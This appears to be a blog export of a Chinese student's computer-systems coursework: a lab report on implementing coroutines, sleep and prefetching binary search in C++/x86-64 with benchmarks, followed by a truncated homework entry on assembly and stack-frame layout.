punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>                all_finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token comment">// 记录正在执行的协程 id</span>                context_id <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token comment">// 调用 resume() 返回调度器</span>                coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/common.h */</span><span class="token keyword">void</span> <span class="token function">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_pool<span class="token operator">-&gt;</span>is_parallel<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 从 g_pool 中获取当前协程状态</span>        <span class="token keyword">auto</span> context <span class="token operator">=</span> g_pool<span class="token operator">-&gt;</span>coroutines<span class="token punctuation">[</span>g_pool<span class="token operator">-&gt;</span>context_id<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 调用 coroutine_switch 切换到 coroutine_pool 上下文</span>        <span class="token comment">// 保存 caller-saved 寄存器, 恢复 callee-saved 寄存器</span>        <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>context<span class="token operator">-&gt;</span>callee_registers<span class="token punctuation">,</span> context<span class="token operator">-&gt;</span>caller_registers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/context.h */</span><span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 调用 coroutine_switch</span>    <span class="token comment">// 保存 callee-saved 寄存器, 恢复 callee-saved 寄存器</span>    <span class="token comment">// 将 rip 恢复到协程 yield 后需执行的指令地址</span>    <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>caller_registers<span class="token punctuation">,</span> callee_registers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>basic_context</code> 类构造函数在堆上开辟了协程栈 <code>stack</code>, 因为 <code>x86-64</code> 要求运行栈栈帧按照 16 字节对齐, 因此需要将栈顶地址 <code>rsp</code> 低 16 字节置 0, 使其为 16 的倍数.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 栈顶地址 rsp</span><span class="token keyword">uint64_t</span> rsp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack<span class="token punctuation">[</span>stack_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 对齐到 16 字节边界</span>rsp <span class="token operator">=</span> rsp <span class="token operator">-</span> <span class="token punctuation">(</span>rsp <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="额外要求"><a href="#额外要求" class="headerlink" title="额外要求"></a>额外要求</h3><ul><li><p><strong>执行 <code>coroutine_switch</code> 时栈的变化过程:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301948307.png" alt=""></p><ul><li>调度器通过 <code>resume()</code> 切换至协程内部时, 将 <code>callee registers</code> 保存在 <code>caller_registers[]</code>, 同时从 <code>callee_registers[]</code> 中恢复  <code>callee registers</code>, 并使用 <code>jmpq</code> 返回之前协程的结束地址.</li><li>协程函数通过 <code>yield()</code> 返回至调度器时, 将 <code>callee registers</code> 保存在 <code>callee_registees[]</code>, 同时从 <code>caller_registers[]</code> 中恢复 <code>callee registers</code>, 并使用 <code>jmpq</code> 返回调度器中.</li></ul></li><li><p><strong>协程是如何开始执行的:</strong></p><p>初始化一个协程时, <code>caller_registers</code> 用于保存 <code>coroutine pool</code> 的上下文, <code>callee_registers</code> 用于保存协程函数的上下文, <code>finished</code> 状态置为 <code>false</code>. 协程自身 <code>rip</code> 寄存器设置为 <code>coroutine_entry</code>,  <code>r12</code> 寄存器设置为 <code>coroutine_main</code> 地址, <code>r13</code> 寄存器设置为协程自身地址.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token double-colon punctuation">::</span>RSP<span class="token punctuation">]</span> <span class="token operator">=</span> rsp<span class="token punctuation">;</span><span class="token comment">// 协程入口是 coroutine_entry</span>callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token double-colon punctuation">::</span>RIP<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>coroutine_entry<span class="token punctuation">;</span><span class="token comment">// 设置 r12 寄存器为 coroutine_main 的地址</span>callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token double-colon punctuation">::</span>R12<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>coroutine_main<span class="token punctuation">;</span><span class="token comment">// 设置 r13 寄存器，用于 coroutine_main 的参数</span>callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token double-colon punctuation">::</span>R13<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当通过 <code>coroutines[i]-&gt;resume()</code> 进入该协程时,  <code>coroutine_switch</code> 会将 <code>callee_registers</code> 内容读入系统, 此时 <code>%rip</code> 存放了 <code>coroutine_entry</code> 的地址. <code>coroutine_entry</code> 将协程地址作为参数传入 <code>%rax</code> 并调用了 <code>coroutine_main</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.global coroutine_entrycoroutine_entry:    movq %r13, %rdi    callq *%r12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>coroutine_main</code> 通过 <code>context-&gt;run()</code> 运行协程, 在运行完毕后将协程 <code>finished</code> 状态置为 <code>true</code>, 并通过 <code>coroutine_switch</code> 切换回调度器.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">coroutine_main</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">basic_context</span> <span class="token operator">*</span>context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    context<span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    context<span class="token operator">-&gt;</span>finished <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>context<span class="token operator">-&gt;</span>callee_registers<span class="token punctuation">,</span> context<span class="token operator">-&gt;</span>caller_registers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// unreachable</span>    <span class="token function">assert</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>考虑浮点和向量寄存器的情况:</strong></p><p><code>AMD64</code> 架构中存在 <code>8</code> 个大小 <code>256</code> 位的 <code>Vector Registers</code>: <code>%xmm0</code> - <code>%xmm7</code>, <code>8</code> 个大小 <code>256</code> 位的 <code>Extended Vector Registers</code>: <code>%xmm8</code> - <code>%xmm15</code>, <code>8</code> 个大小 <code>80</code> 位的 <code>Floating Point Registers</code>: <code>%st0</code> - <code>%st7</code>.</p><p>只需在 <code>basic_context</code> 结构体初始化时开辟与 <code>Floating Point Registers</code> 和 <code>Vector Registers</code> 大小相应的 <code>uint64_t</code> 数组, 并在执行 <code>coroutine_switch</code> 时将相应 <code>register</code> 的内容分别 <code>save</code> 与 <code>load</code> 即可.</p></li></ul><h2 id="Task-2-实现-sleep-函数"><a href="#Task-2-实现-sleep-函数" class="headerlink" title="Task 2: 实现 sleep 函数"></a>Task 2: 实现 sleep 函数</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/coroutine_pool.h */</span><span class="token keyword">void</span> <span class="token function">serial_execute_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">bool</span> all_finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 记录所有协程函数是否执行完成</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>all_finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>        all_finished <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">// 采用轮询的方式挑选一个未完成执行的协程函数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> coroutines<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// context 是否 finish</span>            <span class="token comment">// context 是否 ready</span>            <span class="token comment">// 调用ready_func 后 context 是否 ready</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>                all_finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token comment">// 判断当前协程的 ready 状态</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>ready<span class="token punctuation">)</span>                    <span class="token comment">// 更新 ready 状态</span>                    coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>ready <span class="token operator">=</span> coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">ready_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 当前协程为 ready 状态时进入协程</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>ready<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment">// 更改正在执行的协程 id</span>                    context_id <span class="token operator">=</span> i<span class="token punctuation">;</span>                    <span class="token comment">// 调用 resume() 返回调度器</span>                    coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/common.h */</span><span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span> ms<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">// 从 g_pool 中获取当前协程状态</span>    <span class="token keyword">auto</span> context <span class="token operator">=</span> g_pool<span class="token operator">-&gt;</span>coroutines<span class="token punctuation">[</span>g_pool<span class="token operator">-&gt;</span>context_id<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 将协程置为 false</span>    context<span class="token operator">-&gt;</span>ready <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">// 获取当前时间，更新 ready_func</span>    <span class="token comment">// ready_func：检查当前时间，如果已经超时，则返回 true</span>    <span class="token keyword">auto</span> cur <span class="token operator">=</span> <span class="token function">get_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 Lambda 表达式注册一个新的 ready_func 函数</span>    <span class="token comment">// 在至少 ms 毫秒之后将协程置为可用状态</span>    context<span class="token operator">-&gt;</span>ready_func <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span>cur<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ms<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token keyword">bool</span><span class="token punctuation">{</span> <span class="token keyword">return</span> std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">duration_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span>milliseconds<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token function">get_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> cur<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> ms<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">// 调用 coroutine_switch 实现 yield 协程</span>    <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>context<span class="token operator">-&gt;</span>callee_registers<span class="token punctuation">,</span> context<span class="token operator">-&gt;</span>caller_registers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="额外要求-1"><a href="#额外要求-1" class="headerlink" title="额外要求"></a>额外要求</h3><ul><li><p><strong>绘制出 <code>sleep_sort</code> 中不同协程的运行情况:</strong></p><p>以输入 <code>1, 3, 4, 5, 2</code> 为例, 不同协程的运行情况如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301948308.png" alt=""></p><p>| time/ms | coroutine1 | coroutine2 | coroutine3 | coroutine4 | coroutine5 |<br>| :——-: | :————: | :————: | :————: | :————: | :————: |<br>|    0    |  unready   |  unready   |  unready   |  unready   |  unready   |<br>|    1    |   ready    |  unready   |  unready   |  unready   |  unready   |<br>|    2    |   finish   |  unready   |  unready   |  unready   |   ready    |<br>|    3    |   finish   |   ready    |  unready   |  unready   |   finish   |<br>|    4    |   finish   |   finish   |   ready    |  unready   |   finish   |<br>|    5    |   finish   |   finish   |   finish   |   ready    |   finish   |<br>|    6    |   finish   |   finish   |   finish   |   finish   |   finish   |</p><p>其中每当一个协程状态被更新为 <code>ready</code> 时, 系统会 <code>resume</code> 至该协程, 运行并输出相应结果.</p></li><li><p><strong>设计更加高效的实现方法:</strong></p><ul><li>在进行 <code>parallel_execute_all()</code> 时, 首先将所有协程的 <code>index</code> 依次加入一个 <code>_coroutine</code> 队列, 依次弹出队首 <code>index</code> 并切换至相应的协程. 若从该协程切出时, 协程状态为 <code>unready</code>, 则将其 <code>index</code> 加入一个 <code>_sleep</code> 优先队列; 若从该协程切出时, 协程状态为 <code>ready</code> 且 <code>unfinished</code>, 则将其加入原 <code>_coroutine</code> 队列.</li><li>在每次向 <code>_sleep</code> 加入 <code>index</code> 时为 <code>index</code> 维护一个变量 <code>time</code>, 它记录当前协程调用 <code>sleep(ms)</code> 后可将自身协程状态置为 <code>ready</code> 的时间点, 即 <code>time = ms + passed_time</code>, 其中 <code>passed_time</code> 为调用 <code>parallel_execute_all()</code> 后经过的时间. 以 <code>time</code> 为排序依据将 <code>index</code> 加入 <code>_sleep</code>. </li><li>在 <code>_coroutine</code> 为空队列后, 且时间到达队首元素的 <code>time</code> 时, 弹出 <code>_sleep</code> 队首元素, 更新其 <code>ready</code> 状态并切入相应协程. 通过如此操作可以节省无效轮询的时间占用.</li></ul></li></ul><h2 id="Task-3-利用协程优化二分查找"><a href="#Task-3-利用协程优化二分查找" class="headerlink" title="Task 3: 利用协程优化二分查找"></a>Task 3: 利用协程优化二分查找</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* src/binary_search.cpp */</span><span class="token keyword">void</span> <span class="token function">lookup_coroutine</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">uint32_t</span> <span class="token operator">*</span>table<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> value<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> <span class="token operator">*</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">// 使用 __builtin_prefetch 预取容易产生缓存缺失的内存</span>    <span class="token function">__builtin_prefetch</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>table<span class="token punctuation">[</span>probe<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 在协程 IO 期间进行其他函数调用</span>    <span class="token function">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__builtin_prefetch</code> 的三个参数分别为 <code>操作地址</code>、<code>读 \ 写</code>、<code>时间局部性</code>.</p><p>第二个参数为 <code>0</code>, 表示进行内存读取; 第三个参数为 <code>3</code>, 表示被访问的数据具有高时间局部性, 在被访问不久之后非常有可能再次访问.</p><h3 id="额外要求-2"><a href="#额外要求-2" class="headerlink" title="额外要求"></a>额外要求</h3><ul><li><p><strong>测试环境:</strong></p><blockquote><p>Architecture: x86_64</p><p>Model name: Intel(R) Xeon(R) CPU E5-4610 v2 @ 2.30GHz</p><p>CPU MHz: 2294.600</p><p>CPU max MHz: 2700.0000</p><p>CPU min MHz: 1200.0000</p><p>PS: 对每组实验条件均进行了十次测试, 并对耗时取平均值</p></blockquote></li><li><p><strong>测试 <code>Size (l)</code> 的影响因素:</strong></p><p>| Size (l) | naive (per access) / ns | coroutine (per access) / ns |<br>| :———: | :——————————-: | :————————————-: |<br>|    4     |          1.61           |            62.53            |<br>|    8     |          2.53           |            52.37            |<br>|    12    |          3.63           |            50.06            |<br>|    16    |          3.87           |            47.24            |<br>|    20    |          8.27           |            47.71            |<br>|    24    |          28.04          |            46.01            |<br>|    28    |          45.53          |            44.92            |<br>|    32    |          58.99          |            46.71            |</p><blockquote><p>此时使用默认参数 <code>m = 1e6</code>, <code>b = 16</code>.</p></blockquote></li><li><p>所给数据范围较小时, 缓存的效果不显著, 在协程调度的轮询与切换上消耗了过多时间, 协程查找效果并不显著;</p></li><li><p>所给数据范围较大时, 协程查找可以在某协程进行 IO 操作时切入其他协程, 实现了时间优化.</p></li><li><p><strong>测试 <code>Loops (m)</code> 的影响因素:</strong></p><p>| Loops (m) | naive (per access) / ns | coroutine (per access) / ns |<br>| :———-: | :——————————-: | :————————————-: |<br>|    80     |          98.74          |            87.52            |<br>|    400    |          82.47          |            57.18            |<br>|   2000    |          75.70          |            51.34            |<br>|   10000   |          67.64          |            50.73            |<br>|  100000   |          59.74          |            51.60            |<br>|  1000000  |          62.28          |            57.86            |<br>| 10000000  |          61.31          |            56.65            |</p><blockquote><p>此时使用默认参数 <code>l = 32</code>, <code>b = 16</code>.</p></blockquote></li><li><p>随着查找次数的增多, 缓存的数据量随着查找次数增大, 在之后进行查找更容易命中缓存, 直接二分查找和协程查找的性能都增强了.</p></li><li><p><strong>测试 <code>Batch size (b)</code> 的影响因素:</strong></p><p>| Batch size (b) | naive (per access) / ns | coroutine (per access) / ns |<br>| :——————: | :——————————-: | :————————————-: |<br>|       4        |          59.46          |            55.01            |<br>|       8        |          62.66          |            51.95            |<br>|       20       |          60.47          |            57.72            |<br>|       32       |          58.93          |            87.17            |<br>|       50       |          63.34          |            86.26            |<br>|       80       |          61.43          |            89.07            |<br>|      100       |          60.58          |            98.05            |<br>|      1000      |          57.43          |           170.98            |<br>|     10000      |          60.23          |           259.12            |</p><blockquote><p>此时使用默认参数 <code>l = 32</code>, <code>m = 1e6</code>.</p></blockquote></li><li><p><code>Batch size</code> 的增大不会影响直接二分查找的性能; <code>Batch size</code> 增大时, 协程查找的性能在增加后迅速降低;</p></li><li><p>当 <code>Batch size</code> 较小时, 协程查找在一次轮询后可能并未完成相应 IO 操作, 浪费了时间; 而当 <code>Batch size</code> 较大时, 协程轮询与调度操作消耗时间过多, 性能降低.</p></li></ul><h2 id="沟通与交流情况"><a href="#沟通与交流情况" class="headerlink" title="沟通与交流情况"></a>沟通与交流情况</h2><ul><li>与陈鑫圣同学交流了如何设计更加高效的 <code>sleep_sort</code>, 以及不同因素对二分查找性能的影响.</li><li>参考了<a href="https://ouuan.github.io/post/lambda-capture-local-variable-by-reference/">本篇文章</a>, 使用 <code>lambda</code> 表达式实现在 <code>sleep()</code> 内更新 <code>ready_func</code> 的操作.</li></ul><h2 id="个人小结与感想"><a href="#个人小结与感想" class="headerlink" title="个人小结与感想"></a>个人小结与感想</h2><p>这是我第一次接触协程的概念与原理, 进行理解与尝试时感到了不小的困难, 在经过习题课对实验框架的具体分析以及自己的尝试后, 我觉得自己更加深刻地了解了协程原理. 通过与同学的交流、对资料的检索, 我明白了考量程序性能的必要性与重要性, 对计算机系统的组成原理有了更为深刻的认识.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业3</title>
      <link href="/2022/10/26/ji-suan-ji-xi-tong-gai-lun-zuo-ye-3/"/>
      <url>/2022/10/26/ji-suan-ji-xi-tong-gai-lun-zuo-ye-3/</url>
      
        <content type="html"><![CDATA[<ol><li><p>编程解决猴子吃桃问题: 每天吃一半再多吃一个, 第十天想吃时候只剩一个,  问总共有多少. 该程序的 $C$ 语言程序如下, 请在其对应汇编代码 ($Linux X86- 64$) 内填入缺失内容.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">eat_peaches</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">eat_peaches</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">eat_peaches:    cmpl $10, __①__    je   __②__    subq $8, %rsp    addl $1, %edi    call eat_peaches    leal 2(%rax, __③__), %eax    jmp  __④__.L3:movl $1, %eax __⑤__ .L2:    addq __⑥__, %rsp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">①<span class="token operator">:</span> <span class="token operator">%</span>edi②<span class="token operator">:</span> <span class="token punctuation">.</span>L3③<span class="token operator">:</span> <span class="token operator">%</span>rax④<span class="token operator">:</span> <span class="token punctuation">.</span>L2⑤<span class="token operator">:</span> ret⑥<span class="token operator">:</span> $<span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>有下列 $C$ 代码以及对应的汇编代码 ($Linux X86-64$), 请填充下表, 即给出各个变量或者寄存器在栈中的存储位置 (以相对于栈帧基址寄存器 <code>%rbp​</code> 的十进制偏移量形式给出, 可正可负); 如果无法以 “在栈中的存储位置” 形式给出, 请说明理由.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF0F1F2F3</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a[0] = 0x%x, a[1] = 0x%x, buf = %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.LC0:.string "a[0] = 0x%x, a[1] = 0x%x, buf = %s\n"foo:    pushq %rbp    movq  %rsp, %rbp    pushq %rbx    subq  $24, %rsp    movl  %edi, %ebx    leaq  -32(%rbp), %rdi    movl  $0, %eax    call  gets    leaq  -32(%rbp), %rcx    movl  %ebx, %edx    movl  $-252579085, %esi    movl  $.LC0, %edi    movl  $0, %eax    call  printf    addq  $24, %rsp    popq  %rbx    popq  %rbp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> <center>|      变量       | 十进制形式的 $offset$ (或者说明) || :-------------: | :------------------------------: ||       `a`       |          经过优化, 未在栈帧中存储          ||     `a[2]`      |          经过优化, 未在栈帧中存储          ||       `x`       | 存储在 `%rbx` 中, 未在栈帧中存储 ||      `buf`      |              $-32$               ||    `buf[3]`     |              $-29$               || `%rbx` 的保存值  |               $-8$               | </center></li><li><p>过程调用以及返回的顺序在一般情况下都是 “过程返回的顺序恰好与调用顺序相反”, 